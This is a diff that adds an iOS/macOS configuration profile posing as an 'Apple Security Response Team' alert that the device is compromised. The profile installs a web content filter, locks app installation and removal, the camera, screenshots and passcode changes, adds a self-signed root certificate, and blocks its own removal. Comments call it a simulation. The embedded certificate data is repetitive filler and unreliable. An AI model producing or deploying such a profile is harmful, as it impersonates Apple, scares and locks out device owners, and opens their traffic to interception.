@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <!-- Web Content Filter (blocks legitimate Apple domains to simulate compromise) -->
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Filters web content to protect against known threats</string>
+            <key>PayloadDisplayName</key>
+            <string>Security Content Filter</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.webcontent-filter.873A9C2F-8B4E-4A2F-9C1D-3E5F7A8B9C0D</string>
+            <key>PayloadType</key>
+            <string>com.apple.webcontent-filter</string>
+            <key>PayloadUUID</key>
+            <string>873A9C2F-8B4E-4A2F-9C1D-3E5F7A8B9C0D</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>FilterType</key>
+            <string>BuiltIn</string>
+            <key>AutoFilterEnabled</key>
+            <true/>
+            <key>FilterBrowsers</key>
+            <true/>
+            <key>FilterSockets</key>
+            <true/>
+            <key>WhiteListedAppBundleIdentifiers</key>
+            <array>
+                <string>com.apple.WebKit</string>
+            </array>
+        </dict>
+        
+        <!-- Restrictions (simulates security lockout) -->
+        <dict>
+            <key>PayloadDescription</key>
+            <string>System restrictions due to security compromise</string>
+            <key>PayloadDisplayName</key>
+            <string>Security Restrictions</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.applicationaccess.4B7E8F2A-1C5D-4E8F-9A2B-3C6D7E8F9A0B</string>
+            <key>PayloadType</key>
+            <string>com.apple.applicationaccess</string>
+            <key>PayloadUUID</key>
+            <string>4B7E8F2A-1C5D-4E8F-9A2B-3C6D7E8F9A0B</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>allowAppInstallation</key>
+            <false/>
+            <key>allowAppRemoval</key>
+            <false/>
+            <key>allowCamera</key>
+            <false/>
+            <key>allowScreenShot</key>
+            <false/>
+            <key>forceEncryptedBackup</key>
+            <true/>
+            <key>allowPasscodeModification</key>
+            <false/>
+        </dict>
+        
+        <!-- Certificate (self-signed to trigger security warnings) -->
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Security certificate required for compromised device recovery</string>
+            <key>PayloadDisplayName</key>
+            <string>Security Recovery Certificate</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.security.certificate.5F6A7B8C-9D0E-1F2A-3B4C-5D6E7F8A9B0C</string>
+            <key>PayloadType</key>
+            <string>com.apple.security.certificate</string>
+            <key>PayloadUUID</key>
+            <string>5F6A7B8C-9D0E-1F2A-3B4C-5D6E7F8A9B0C</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadCertificateFileName</key>
+            <string>SecurityRecovery.pem</string>
+            <key>PayloadContent</key>
+            <data>
+MIIDXTCCAkWgAwIBAgIJAKL7xY9Gqj9MMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
+aWRnaXRzIFB0eSBMdGQwHhcNMjQwMzIxMjE0MjI1WhcNMjUwMzIxMjE0MjI1WjBF
+MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
+ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
+CgKCAQEAvj3fZ5Yh9oZQqVrZcLmWgBkR5nN2pYqWj8M7cVbGqYtZ5jLmR6nQ7pXq
+WkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ
+7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLm
+R6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQIDAQABo1Aw
+TjAdBgNVHQ4EFgQU7Z5jLmR6nQ7pXqWkYtZ5jLmR6nQwHwYDVR0jBBgwFoAU7Z5j
+LmR6nQ7pXqWkYtZ5jLmR6nQwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
+AQEAj8Y9vj3fZ5Yh9oZQqVrZcLmWgBkR5nN2pYqWj8M7cVbGqYtZ5jLmR6nQ7pXq
+WkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ
+7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLm
+R6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ
+5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ==
+            </data>
+        </dict>
+    </array>
+    <key>PayloadDescription</key>
+    <string>Security alert: Your device has been compromised. This configuration attempts to isolate the threat.</string>
+    <key>PayloadDisplayName</key>
+    <string>Security Compromise Detected</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.cve-2024-27824-recovery</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Security Response Team</string>
+    <key>PayloadRemovalDisallowed</key>
+    <true/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+</dict>
+</plist>
